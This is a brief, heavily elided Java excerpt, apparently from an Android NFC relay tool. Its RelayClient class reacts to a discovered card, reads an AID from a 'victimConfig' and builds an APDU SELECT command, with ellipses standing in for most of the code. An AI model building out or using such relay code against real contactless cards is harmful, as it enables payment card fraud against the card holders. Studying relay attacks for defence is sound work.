...
public class RelayClient implements NfcAdapter.ReaderCallback {
    ...
    public void onTagDiscovered(Tag card) {
        ...
        mAidSelectorThread = new Thread() { public void run() { selectTask(); }};
    ...
    private boolean selectAID() {
        ...
        String aid = Hex.hex(victimConfig.aid);
        Log.i(TAG, "Requesting remote AID: " + aid);
        String command = SELECT_APDU_HEADER + String.format("%02X", aid.length() / 2) + aid;
